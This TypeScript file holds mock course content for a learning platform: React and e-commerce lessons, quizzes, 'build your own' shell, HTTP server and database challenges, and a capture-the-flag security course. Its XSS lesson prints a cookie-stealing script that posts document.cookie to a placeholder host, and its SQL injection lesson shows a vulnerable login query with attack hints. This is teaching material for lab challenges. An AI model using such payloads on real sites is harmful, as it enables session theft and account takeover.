import type { Module, Lesson, QuizQuestion } from '@/types';

// Mock content for React Development Bootcamp (Course ID: 1)
export const reactCourseModules: Module[] = [
  {
    id: 'react-module-1',
    course_id: '1',
    title: 'React Fundamentals',
    description: 'Learn the core concepts of React including components, props, and state.',
    order_index: 1,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-module-2',
    course_id: '1',
    title: 'React Hooks Deep Dive',
    description: 'Master React hooks including useState, useEffect, useContext, and custom hooks.',
    order_index: 2,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-module-3',
    course_id: '1',
    title: 'State Management & Context',
    description: 'Learn advanced state management patterns and React Context API.',
    order_index: 3,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-module-4',
    course_id: '1',
    title: 'React Router & Navigation',
    description: 'Implement client-side routing and navigation in React applications.',
    order_index: 4,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
];

export const reactCourseLessons: Lesson[] = [
  // Module 1 Lessons
  {
    id: 'react-lesson-1',
    module_id: 'react-module-1',
    title: 'Introduction to React',
    description: 'What is React and why should you learn it? Understanding the virtual DOM and component-based architecture.',
    content_type: 'video',
    content_url: 'https://example.com/react-intro.mp4',
    content_text: `# Introduction to React

React is a JavaScript library for building user interfaces, particularly web applications. It was created by Facebook and is now maintained by Meta and the open-source community.

## Key Concepts:
- **Component-Based**: Build encapsulated components that manage their own state
- **Virtual DOM**: Efficient updates through a virtual representation of the DOM
- **Declarative**: Describe what the UI should look like for any given state
- **Learn Once, Write Anywhere**: Use React for web, mobile, and desktop applications

## Why React?
1. **Performance**: Virtual DOM enables efficient updates
2. **Reusability**: Components can be reused across different parts of your application
3. **Developer Experience**: Great tooling and debugging capabilities
4. **Community**: Large ecosystem and community support`,
    duration_minutes: 15,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-lesson-2',
    module_id: 'react-module-1',
    title: 'Creating Your First Component',
    description: 'Learn how to create and use React components with JSX syntax.',
    content_type: 'video',
    content_url: 'https://example.com/first-component.mp4',
    content_text: `# Creating Your First Component

Components are the building blocks of React applications. Let's create your first component!

## Function Components

\`\`\`jsx
function Welcome(props) {
  return <h1>Hello, {props.name}!</h1>;
}

// Or using arrow function
const Welcome = (props) => {
  return <h1>Hello, {props.name}!</h1>;
};
\`\`\`

## Using Components

\`\`\`jsx
function App() {
  return (
    <div>
      <Welcome name="Alice" />
      <Welcome name="Bob" />
      <Welcome name="Charlie" />
    </div>
  );
}
\`\`\`

## JSX Rules
1. Return a single parent element
2. Use className instead of class
3. Close all tags
4. Use camelCase for attributes`,
    duration_minutes: 20,
    order_index: 2,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-lesson-3',
    module_id: 'react-module-1',
    title: 'Props and State Quiz',
    description: 'Test your understanding of React props and state management.',
    content_type: 'quiz',
    duration_minutes: 10,
    order_index: 3,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  // Module 2 Lessons
  {
    id: 'react-lesson-4',
    module_id: 'react-module-2',
    title: 'useState Hook',
    description: 'Master the useState hook for managing component state.',
    content_type: 'video',
    content_url: 'https://example.com/usestate-hook.mp4',
    content_text: `# useState Hook

The useState hook allows you to add state to functional components.

## Basic Usage

\`\`\`jsx
import React, { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <p>You clicked {count} times</p>
      <button onClick={() => setCount(count + 1)}>
        Click me
      </button>
    </div>
  );
}
\`\`\`

## Multiple State Variables

\`\`\`jsx
function UserProfile() {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [age, setAge] = useState(0);

  // ... component logic
}
\`\`\`

## State with Objects

\`\`\`jsx
function UserForm() {
  const [user, setUser] = useState({
    name: '',
    email: '',
    age: 0
  });

  const updateUser = (field, value) => {
    setUser(prevUser => ({
      ...prevUser,
      [field]: value
    }));
  };
}
\`\`\``,
    duration_minutes: 25,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
  {
    id: 'react-lesson-5',
    module_id: 'react-module-2',
    title: 'useEffect Hook',
    description: 'Learn how to handle side effects in React components.',
    content_type: 'video',
    content_url: 'https://example.com/useeffect-hook.mp4',
    content_text: `# useEffect Hook

The useEffect hook lets you perform side effects in functional components.

## Basic Usage

\`\`\`jsx
import React, { useState, useEffect } from 'react';

function Example() {
  const [count, setCount] = useState(0);

  // Similar to componentDidMount and componentDidUpdate:
  useEffect(() => {
    document.title = \`You clicked \${count} times\`;
  });

  return (
    <div>
      <p>You clicked {count} times</p>
      <button onClick={() => setCount(count + 1)}>
        Click me
      </button>
    </div>
  );
}
\`\`\`

## Effect with Cleanup

\`\`\`jsx
useEffect(() => {
  const timer = setInterval(() => {
    console.log('Timer tick');
  }, 1000);

  // Cleanup function
  return () => {
    clearInterval(timer);
  };
}, []); // Empty dependency array means this runs once
\`\`\`

## Conditional Effects

\`\`\`jsx
useEffect(() => {
  fetchUserData(userId);
}, [userId]); // Only re-run when userId changes
\`\`\``,
    duration_minutes: 30,
    order_index: 2,
    is_published: true,
    created_at: '2024-01-15T10:00:00Z',
    updated_at: '2024-01-15T10:00:00Z',
  },
];

// Mock content for Cybersecurity CTF Challenges (Course ID: 2)
export const ctfCourseModules: Module[] = [
  {
    id: 'ctf-module-1',
    course_id: '2',
    title: 'Web Application Security',
    description: 'Learn to identify and exploit common web vulnerabilities.',
    order_index: 1,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
  {
    id: 'ctf-module-2',
    course_id: '2',
    title: 'Cryptography Challenges',
    description: 'Master cryptographic concepts through hands-on challenges.',
    order_index: 2,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
  {
    id: 'ctf-module-3',
    course_id: '2',
    title: 'Binary Exploitation',
    description: 'Learn buffer overflows, ROP chains, and memory corruption.',
    order_index: 3,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
];

export const ctfCourseLessons: Lesson[] = [
  {
    id: 'ctf-lesson-1',
    module_id: 'ctf-module-1',
    title: 'SQL Injection Challenge',
    description: 'Exploit SQL injection vulnerabilities to extract sensitive data.',
    content_type: 'code_challenge',
    content_text: `# SQL Injection Challenge

## Objective
Your goal is to extract the admin password from the vulnerable login form.

## Challenge Description
You've discovered a login form that appears to be vulnerable to SQL injection. The application uses the following query:

\`\`\`sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
\`\`\`

## Your Mission
1. Identify the SQL injection vulnerability
2. Bypass the authentication mechanism
3. Extract the admin user's password from the database

## Hints
- Try using single quotes to break out of the SQL query
- Consider using UNION SELECT to extract data
- The users table has columns: id, username, password, email

## Flag Format
The flag will be in the format: \`CTF{extracted_password}\`

## Challenge Environment
Access the vulnerable application at: https://ctf-lab.example.com/sqli-1

Good luck, and remember: only test on authorized systems!`,
    duration_minutes: 45,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
  {
    id: 'ctf-lesson-2',
    module_id: 'ctf-module-1',
    title: 'Cross-Site Scripting (XSS)',
    description: 'Learn to identify and exploit XSS vulnerabilities.',
    content_type: 'code_challenge',
    content_text: `# Cross-Site Scripting (XSS) Challenge

## Objective
Execute JavaScript code in the context of another user's browser session.

## Challenge Description
You've found a comment system that doesn't properly sanitize user input. Your goal is to inject JavaScript that will steal the admin's session cookie.

## Your Mission
1. Find the XSS vulnerability in the comment system
2. Craft a payload that steals cookies
3. Capture the admin's session token

## Payload Ideas
\`\`\`javascript
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
\`\`\`

## Advanced Payload
\`\`\`javascript
<script>
fetch('https://your-server.com/steal', {
  method: 'POST',
  body: document.cookie
});
</script>
\`\`\`

## Challenge Environment
Access the vulnerable application at: https://ctf-lab.example.com/xss-1`,
    duration_minutes: 40,
    order_index: 2,
    is_published: true,
    created_at: '2024-01-10T14:30:00Z',
    updated_at: '2024-01-10T14:30:00Z',
  },
];

// Mock content for Full-Stack E-commerce App (Course ID: 3)
export const ecommerceCourseModules: Module[] = [
  {
    id: 'ecommerce-module-1',
    course_id: '3',
    title: 'Project Setup & Architecture',
    description: 'Set up the development environment and plan the application architecture.',
    order_index: 1,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
  {
    id: 'ecommerce-module-2',
    course_id: '3',
    title: 'Backend API Development',
    description: 'Build RESTful APIs with Node.js, Express, and MongoDB.',
    order_index: 2,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
  {
    id: 'ecommerce-module-3',
    course_id: '3',
    title: 'Frontend Development',
    description: 'Create a responsive React frontend with modern UI components.',
    order_index: 3,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
  {
    id: 'ecommerce-module-4',
    course_id: '3',
    title: 'Payment Integration',
    description: 'Integrate Stripe for secure payment processing.',
    order_index: 4,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
];

export const ecommerceCourseLessons: Lesson[] = [
  {
    id: 'ecommerce-lesson-1',
    module_id: 'ecommerce-module-1',
    title: 'Project Requirements & Planning',
    description: 'Define the project scope and technical requirements.',
    content_type: 'text',
    content_text: `# E-commerce Project Requirements

## Project Overview
We'll build a full-featured e-commerce platform with the following capabilities:

### Core Features
- **Product Management**: CRUD operations for products
- **User Authentication**: Registration, login, and profile management
- **Shopping Cart**: Add, remove, and modify cart items
- **Order Processing**: Checkout flow and order management
- **Payment Integration**: Secure payments with Stripe
- **Admin Dashboard**: Manage products, orders, and users

### Technical Stack
- **Frontend**: React with TypeScript
- **Backend**: Node.js with Express
- **Database**: MongoDB with Mongoose
- **Authentication**: JWT tokens
- **Payments**: Stripe API
- **Deployment**: Docker containers

### Database Schema
\`\`\`javascript
// User Schema
{
  _id: ObjectId,
  email: String,
  password: String (hashed),
  firstName: String,
  lastName: String,
  role: String, // 'customer' | 'admin'
  addresses: [AddressSchema],
  createdAt: Date
}

// Product Schema
{
  _id: ObjectId,
  name: String,
  description: String,
  price: Number,
  category: String,
  images: [String],
  inventory: Number,
  isActive: Boolean,
  createdAt: Date
}

// Order Schema
{
  _id: ObjectId,
  userId: ObjectId,
  items: [OrderItemSchema],
  totalAmount: Number,
  status: String, // 'pending' | 'paid' | 'shipped' | 'delivered'
  shippingAddress: AddressSchema,
  paymentId: String,
  createdAt: Date
}
\`\`\``,
    duration_minutes: 20,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
  {
    id: 'ecommerce-lesson-2',
    module_id: 'ecommerce-module-2',
    title: 'Setting up Express Server',
    description: 'Create the backend server with Express and middleware setup.',
    content_type: 'code_challenge',
    content_text: `# Express Server Setup

## Objective
Set up a robust Express.js server with proper middleware and error handling.

## Your Task
Create an Express server with the following requirements:

### 1. Basic Server Setup
\`\`\`javascript
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(helmet()); // Security headers
app.use(cors()); // Enable CORS
app.use(morgan('combined')); // Logging
app.use(express.json({ limit: '10mb' })); // Parse JSON bodies
app.use(express.urlencoded({ extended: true })); // Parse URL-encoded bodies

// Routes
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

app.listen(PORT, () => {
  console.log(\`Server running on port \${PORT}\`);
});
\`\`\`

### 2. Database Connection
\`\`\`javascript
const mongoose = require('mongoose');

const connectDB = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('MongoDB connected successfully');
  } catch (error) {
    console.error('Database connection failed:', error);
    process.exit(1);
  }
};

connectDB();
\`\`\`

### 3. Environment Variables
Create a \`.env\` file:
\`\`\`
NODE_ENV=development
PORT=5000
MONGODB_URI=mongodb://localhost:27017/ecommerce
JWT_SECRET=your-super-secret-jwt-key
STRIPE_SECRET_KEY=sk_test_...
\`\`\`

## Testing
Test your server by running:
\`\`\`bash
npm start
curl http://localhost:5000/api/health
\`\`\`

Expected response:
\`\`\`json
{
  "status": "OK",
  "timestamp": "2024-01-05T10:30:00.000Z"
}
\`\`\``,
    duration_minutes: 35,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-05T09:15:00Z',
    updated_at: '2024-01-05T09:15:00Z',
  },
];

// Quiz questions for React course
export const reactQuizQuestions: QuizQuestion[] = [
  {
    id: 'react-quiz-1',
    lesson_id: 'react-lesson-3',
    question: 'What is the correct way to pass data from a parent component to a child component in React?',
    type: 'multiple_choice',
    options: [
      'Using state',
      'Using props',
      'Using context',
      'Using refs'
    ],
    correct_answer: 'Using props',
    explanation: 'Props (short for properties) are the mechanism for passing data from parent components to child components in React.',
    order_index: 1,
  },
  {
    id: 'react-quiz-2',
    lesson_id: 'react-lesson-3',
    question: 'Which hook is used to manage local component state in functional components?',
    type: 'multiple_choice',
    options: [
      'useEffect',
      'useState',
      'useContext',
      'useReducer'
    ],
    correct_answer: 'useState',
    explanation: 'The useState hook is specifically designed for managing local state in functional components.',
    order_index: 2,
  },
  {
    id: 'react-quiz-3',
    lesson_id: 'react-lesson-3',
    question: 'True or False: React components must return a single parent element.',
    type: 'true_false',
    correct_answer: 'true',
    explanation: 'React components must return a single parent element, though you can use React.Fragment or <> </> to avoid adding extra DOM nodes.',
    order_index: 3,
  },
];

// Mock content for "Make Your Own" Challenges Course
export const makeYourOwnCourseModules: Module[] = [
  {
    id: 'make-your-own-module-1',
    course_id: '7',
    title: 'System Programming Challenges',
    description: 'Build fundamental system tools from scratch.',
    order_index: 1,
    is_published: true,
    created_at: '2024-01-20T08:00:00Z',
    updated_at: '2024-01-20T08:00:00Z',
  },
  {
    id: 'make-your-own-module-2',
    course_id: '7',
    title: 'Network Programming Challenges',
    description: 'Create network tools and servers from the ground up.',
    order_index: 2,
    is_published: true,
    created_at: '2024-01-20T08:00:00Z',
    updated_at: '2024-01-20T08:00:00Z',
  },
  {
    id: 'make-your-own-module-3',
    course_id: '7',
    title: 'Database & Storage Challenges',
    description: 'Build data storage and retrieval systems.',
    order_index: 3,
    is_published: true,
    created_at: '2024-01-20T08:00:00Z',
    updated_at: '2024-01-20T08:00:00Z',
  },
];

export const makeYourOwnCourseLessons: Lesson[] = [
  {
    id: 'make-your-own-lesson-1',
    module_id: 'make-your-own-module-1',
    title: 'Build Your Own Shell',
    description: 'Create a Unix shell with command execution, pipes, and process management.',
    content_type: 'code_challenge',
    content_text: `# Build Your Own Shell Challenge

## Objective
Create a functional Unix shell that can execute commands, handle pipes, manage processes, and provide a user-friendly command-line interface.

## What You'll Build
Your shell should support:
- **Command Execution**: Run system commands and programs
- **Pipes**: Chain commands together with \`|\` operator
- **I/O Redirection**: Redirect input/output with \`<\`, \`>\`, \`>>\`
- **Background Processes**: Run commands in background with \`&\`
- **Built-in Commands**: Implement \`cd\`, \`pwd\`, \`exit\`, \`history\`
- **Environment Variables**: Support variable expansion

## Technical Requirements

### Core Features
1. **Command Parser**: Parse user input into commands and arguments
2. **Process Management**: Fork processes and handle child process execution
3. **Signal Handling**: Handle Ctrl+C, Ctrl+Z appropriately
4. **Error Handling**: Provide meaningful error messages

### Advanced Features
1. **Job Control**: Track and manage background jobs
2. **Command History**: Store and recall previous commands
3. **Tab Completion**: Auto-complete file and command names
4. **Scripting Support**: Execute shell scripts

## Implementation Guide

### 1. Basic Shell Loop
\`\`\`c
while (1) {
    printf("myshell> ");
    char *input = read_line();
    char **args = parse_line(input);
    int status = execute(args);
    
    free(input);
    free(args);
    
    if (status == EXIT) break;
}
\`\`\`

### 2. Command Parsing
- Split input by whitespace and special characters
- Handle quoted strings and escape sequences
- Identify pipes, redirections, and background operators

### 3. Process Execution
- Use \`fork()\` to create child processes
- Use \`execvp()\` to execute commands
- Use \`waitpid()\` to wait for child completion

### 4. Pipe Implementation
- Create pipes with \`pipe()\` system call
- Connect stdout of one process to stdin of next
- Handle multiple pipes in a pipeline

## Testing Your Shell

Your shell will be tested with:

### Basic Commands
\`\`\`bash
ls -la
pwd
echo "Hello World"
cat /etc/passwd
\`\`\`

### Pipes
\`\`\`bash
ls -la | grep "txt"
cat file.txt | sort | uniq
ps aux | grep "myshell"
\`\`\`

### Redirection
\`\`\`bash
echo "test" > output.txt
cat < input.txt
ls >> log.txt
\`\`\`

### Background Processes
\`\`\`bash
sleep 10 &
long_running_command &
\`\`\`

## Submission Requirements

1. **Source Code**: Complete implementation in C, Python, or your preferred language
2. **Makefile/Build Script**: Instructions to compile and run your shell
3. **README.md**: Documentation with:
   - Build and run instructions
   - Supported features
   - Known limitations
   - Design decisions
4. **Test Suite**: Automated tests for core functionality
5. **Demo Script**: Script showing your shell's capabilities

## Evaluation Criteria

- **Functionality** (40%): Core features work correctly
- **Code Quality** (25%): Clean, readable, well-structured code
- **Error Handling** (15%): Robust error handling and edge cases
- **Documentation** (10%): Clear documentation and comments
- **Testing** (10%): Comprehensive test coverage

## Resources

- [Advanced Programming in the UNIX Environment](http://www.apuebook.com/)
- [Linux System Programming](https://www.oreilly.com/library/view/linux-system-programming/9781449341527/)
- [GNU Bash Manual](https://www.gnu.org/software/bash/manual/)

## Tips for Success

1. **Start Simple**: Begin with basic command execution, then add features
2. **Test Incrementally**: Test each feature as you implement it
3. **Handle Edge Cases**: Consider empty input, invalid commands, etc.
4. **Study Existing Shells**: Look at bash, zsh source code for inspiration
5. **Use Version Control**: Commit frequently to track your progress

Good luck building your shell! 🚀`,
    duration_minutes: 180,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-20T08:00:00Z',
    updated_at: '2024-01-20T08:00:00Z',
  },
  {
    id: 'make-your-own-lesson-2',
    module_id: 'make-your-own-module-2',
    title: 'Build Your Own HTTP Server',
    description: 'Create an HTTP server from scratch with routing, static files, and middleware support.',
    content_type: 'code_challenge',
    content_text: `# Build Your Own HTTP Server Challenge

## Objective
Build a fully functional HTTP server from scratch without using high-level frameworks like Express, Flask, or similar libraries.

## What You'll Build
Your HTTP server should support:
- **HTTP/1.1 Protocol**: Proper request/response handling
- **Multiple HTTP Methods**: GET, POST, PUT, DELETE
- **Static File Serving**: HTML, CSS, JS, images
- **Dynamic Routing**: URL patterns and parameters
- **Middleware System**: Request/response processing pipeline
- **Content Types**: Proper MIME type handling

## Technical Requirements

### Core HTTP Features
1. **Request Parsing**: Parse HTTP headers, body, query parameters
2. **Response Generation**: Format HTTP responses with proper status codes
3. **Keep-Alive**: Support persistent connections
4. **Content-Length**: Handle request/response body sizes

### Server Features
1. **Concurrent Connections**: Handle multiple clients simultaneously
2. **Error Handling**: Proper 404, 500, etc. responses
3. **Logging**: Request/response logging
4. **Configuration**: Configurable port, document root, etc.

## Implementation Guide

### 1. Basic Server Setup
\`\`\`python
import socket
import threading

class HTTPServer:
    def __init__(self, host='localhost', port=8080):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    def start(self):
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"Server running on {self.host}:{self.port}")
        
        while True:
            client_socket, address = self.socket.accept()
            thread = threading.Thread(
                target=self.handle_client, 
                args=(client_socket,)
            )
            thread.start()
\`\`\`

### 2. HTTP Request Parsing
\`\`\`python
def parse_request(self, request_data):
    lines = request_data.split('\\r\\n')
    request_line = lines[0]
    method, path, version = request_line.split(' ')
    
    headers = {}
    body_start = 0
    
    for i, line in enumerate(lines[1:], 1):
        if line == '':
            body_start = i + 1
            break
        key, value = line.split(': ', 1)
        headers[key.lower()] = value
    
    body = '\\r\\n'.join(lines[body_start:]) if body_start else ''
    
    return {
        'method': method,
        'path': path,
        'version': version,
        'headers': headers,
        'body': body
    }
\`\`\`

### 3. Response Generation
\`\`\`python
def create_response(self, status_code, headers, body):
    status_messages = {
        200: 'OK',
        404: 'Not Found',
        500: 'Internal Server Error'
    }
    
    response = f"HTTP/1.1 {status_code} {status_messages[status_code]}\\r\\n"
    
    for key, value in headers.items():
        response += f"{key}: {value}\\r\\n"
    
    response += "\\r\\n"
    response += body
    
    return response.encode()
\`\`\`

### 4. Routing System
\`\`\`python
class Router:
    def __init__(self):
        self.routes = {}
    
    def add_route(self, method, path, handler):
        if method not in self.routes:
            self.routes[method] = {}
        self.routes[method][path] = handler
    
    def match_route(self, method, path):
        if method in self.routes:
            if path in self.routes[method]:
                return self.routes[method][path]
            # Handle dynamic routes with parameters
            for route_path, handler in self.routes[method].items():
                if self.match_pattern(route_path, path):
                    return handler
        return None
\`\`\`

## Testing Your Server

### Basic HTTP Requests
\`\`\`bash
curl -X GET http://localhost:8080/
curl -X POST http://localhost:8080/api/users -d '{"name":"John"}'
curl -X PUT http://localhost:8080/api/users/1 -d '{"name":"Jane"}'
curl -X DELETE http://localhost:8080/api/users/1
\`\`\`

### Static File Serving
\`\`\`bash
curl http://localhost:8080/index.html
curl http://localhost:8080/styles.css
curl http://localhost:8080/script.js
curl http://localhost:8080/image.png
\`\`\`

### Performance Testing
\`\`\`bash
# Test concurrent connections
ab -n 1000 -c 10 http://localhost:8080/

# Test with different file sizes
curl http://localhost:8080/large-file.zip
\`\`\`

## Advanced Features

### Middleware System
\`\`\`python
class Middleware:
    def __init__(self):
        self.middlewares = []
    
    def use(self, middleware_func):
        self.middlewares.append(middleware_func)
    
    def process(self, request, response):
        for middleware in self.middlewares:
            request, response = middleware(request, response)
        return request, response
\`\`\`

### WebSocket Support
- Implement WebSocket handshake
- Handle WebSocket frames
- Support real-time communication

### HTTPS Support
- SSL/TLS certificate handling
- Secure connection establishment
- Certificate validation

## Submission Requirements

1. **Complete Server Implementation**: Working HTTP server
2. **Static File Server**: Serve HTML, CSS, JS, images
3. **API Endpoints**: RESTful API with CRUD operations
4. **Documentation**: API documentation and usage examples
5. **Test Suite**: Unit and integration tests
6. **Performance Benchmarks**: Load testing results

## Evaluation Criteria

- **HTTP Compliance** (30%): Proper HTTP/1.1 implementation
- **Performance** (25%): Handle concurrent connections efficiently
- **Code Architecture** (20%): Clean, modular design
- **Feature Completeness** (15%): All required features implemented
- **Testing** (10%): Comprehensive test coverage

## Resources

- [HTTP/1.1 Specification (RFC 7230)](https://tools.ietf.org/html/rfc7230)
- [MDN HTTP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP)
- [Socket Programming Guide](https://docs.python.org/3/library/socket.html)

Ready to build the web? 🌐`,
    duration_minutes: 240,
    order_index: 1,
    is_published: true,
    created_at: '2024-01-22T14:00:00Z',
    updated_at: '2024-01-22T14:00:00Z',
  },
  {
    id: 'make-your-own-lesson-3',
    module_id: 'make-your-own-module-3',
    title: 'Build Your Own Database',
    description: 'Create a database engine with storage, indexing, and query capabilities.',
    content_type: 'code_challenge',
    content_text: `# Build Your Own Database Challenge

## Objective
Create a functional database system from scratch with persistent storage, indexing, transactions, and a query interface.

## What You'll Build
Your database should support:
- **CRUD Operations**: Create, Read, Update, Delete
- **Persistent Storage**: Data survives server restarts
- **Indexing**: Fast data retrieval with B-trees or hash indexes
- **Transactions**: ACID properties with rollback support
- **Query Language**: SQL-like query interface
- **Concurrent Access**: Multiple clients safely accessing data

## Technical Requirements

### Storage Engine
1. **Page Management**: Fixed-size pages for data storage
2. **Buffer Pool**: In-memory cache for frequently accessed pages
3. **Write-Ahead Logging**: Transaction logging for durability
4. **Free Space Management**: Track and reuse deleted space

### Index Structures
1. **B+ Trees**: For range queries and sorting
2. **Hash Indexes**: For exact-match lookups
3. **Composite Indexes**: Multi-column indexing
4. **Index Maintenance**: Keep indexes updated with data changes

## Implementation Guide

### 1. Storage Layer
\`\`\`python
class StorageEngine:
    def __init__(self, db_file):
        self.db_file = db_file
        self.page_size = 4096
        self.buffer_pool = {}
        self.free_pages = []
        
    def read_page(self, page_id):
        if page_id in self.buffer_pool:
            return self.buffer_pool[page_id]
            
        with open(self.db_file, 'rb') as f:
            f.seek(page_id * self.page_size)
            data = f.read(self.page_size)
            
        page = Page(page_id, data)
        self.buffer_pool[page_id] = page
        return page
        
    def write_page(self, page):
        self.buffer_pool[page.page_id] = page
        
        with open(self.db_file, 'r+b') as f:
            f.seek(page.page_id * self.page_size)
            f.write(page.serialize())
\`\`\`

### 2. B+ Tree Index
\`\`\`python
class BPlusTree:
    def __init__(self, storage, root_page_id=None):
        self.storage = storage
        self.root_page_id = root_page_id
        self.order = 100  # Max keys per node
        
    def search(self, key):
        if not self.root_page_id:
            return None
            
        page = self.storage.read_page(self.root_page_id)
        return self._search_recursive(page, key)
        
    def insert(self, key, value):
        if not self.root_page_id:
            self.root_page_id = self._create_leaf_page()
            
        root_page = self.storage.read_page(self.root_page_id)
        new_root = self._insert_recursive(root_page, key, value)
        
        if new_root:
            self.root_page_id = new_root.page_id
            
    def _split_node(self, page):
        # Implement node splitting for B+ tree
        pass
\`\`\`

### 3. Transaction Manager
\`\`\`python
class TransactionManager:
    def __init__(self, storage, log_file):
        self.storage = storage
        self.log_file = log_file
        self.active_transactions = {}
        self.lock_manager = LockManager()
        
    def begin_transaction(self):
        txn_id = self._generate_txn_id()
        self.active_transactions[txn_id] = Transaction(txn_id)
        self._log_begin(txn_id)
        return txn_id
        
    def commit_transaction(self, txn_id):
        if txn_id not in self.active_transactions:
            raise Exception("Transaction not found")
            
        txn = self.active_transactions[txn_id]
        
        # Write all changes to disk
        for page in txn.modified_pages:
            self.storage.write_page(page)
            
        self._log_commit(txn_id)
        self.lock_manager.release_all_locks(txn_id)
        del self.active_transactions[txn_id]
        
    def rollback_transaction(self, txn_id):
        if txn_id not in self.active_transactions:
            raise Exception("Transaction not found")
            
        # Restore original page states
        txn = self.active_transactions[txn_id]
        for page_id, original_data in txn.original_pages.items():
            page = Page(page_id, original_data)
            self.storage.write_page(page)
            
        self._log_rollback(txn_id)
        self.lock_manager.release_all_locks(txn_id)
        del self.active_transactions[txn_id]
\`\`\`

### 4. Query Processor
\`\`\`python
class QueryProcessor:
    def __init__(self, storage, indexes):
        self.storage = storage
        self.indexes = indexes
        self.parser = SQLParser()
        
    def execute_query(self, sql):
        parsed = self.parser.parse(sql)
        
        if parsed.type == 'SELECT':
            return self._execute_select(parsed)
        elif parsed.type == 'INSERT':
            return self._execute_insert(parsed)
        elif parsed.type == 'UPDATE':
            return self._execute_update(parsed)
        elif parsed.type == 'DELETE':
            return self._execute_delete(parsed)
            
    def _execute_select(self, query):
        # Choose optimal execution plan
        if query.where_clause:
            # Use index if available
            index_name = self._find_best_index(query.where_clause)
            if index_name:
                return self._index_scan(index_name, query)
                
        # Fall back to table scan
        return self._table_scan(query)
\`\`\`

## Testing Your Database

### Basic Operations
\`\`\`sql
-- Create table
CREATE TABLE users (id INT PRIMARY KEY, name VARCHAR(50), email VARCHAR(100));

-- Insert data
INSERT INTO users VALUES (1, 'Alice', 'alice@example.com');
INSERT INTO users VALUES (2, 'Bob', 'bob@example.com');

-- Query data
SELECT * FROM users WHERE id = 1;
SELECT name FROM users WHERE email LIKE '%@example.com';

-- Update data
UPDATE users SET email = 'alice.smith@example.com' WHERE id = 1;

-- Delete data
DELETE FROM users WHERE id = 2;
\`\`\`

### Performance Testing
\`\`\`python
# Test with large datasets
for i in range(100000):
    db.execute(f"INSERT INTO users VALUES ({i}, 'User{i}', 'user{i}@test.com')")

# Test index performance
start_time = time.time()
result = db.execute("SELECT * FROM users WHERE id = 50000")
end_time = time.time()
print(f"Query time: {end_time - start_time} seconds")
\`\`\`

### Concurrent Access Testing
\`\`\`python
import threading

def worker_thread(db, thread_id):
    for i in range(1000):
        txn = db.begin_transaction()
        try:
            db.execute(f"INSERT INTO test VALUES ({thread_id * 1000 + i}, 'data')")
            db.commit_transaction(txn)
        except Exception as e:
            db.rollback_transaction(txn)

# Start multiple threads
threads = []
for i in range(10):
    t = threading.Thread(target=worker_thread, args=(db, i))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
\`\`\`

## Advanced Features

### Query Optimization
- Cost-based query planning
- Join algorithms (nested loop, hash join, sort-merge)
- Query result caching

### Replication
- Master-slave replication
- Write-ahead log shipping
- Conflict resolution

### Backup and Recovery
- Point-in-time recovery
- Incremental backups
- Crash recovery

## Submission Requirements

1. **Complete Database Engine**: All core features implemented
2. **SQL Interface**: Support basic SQL operations
3. **Performance Benchmarks**: Speed and scalability tests
4. **Concurrency Tests**: Multi-threaded access validation
5. **Documentation**: Architecture and API documentation
6. **Recovery Testing**: Crash recovery and data integrity tests

## Evaluation Criteria

- **Correctness** (30%): ACID properties maintained
- **Performance** (25%): Efficient storage and retrieval
- **Concurrency** (20%): Safe multi-user access
- **Code Quality** (15%): Clean, maintainable code
- **Testing** (10%): Comprehensive test coverage

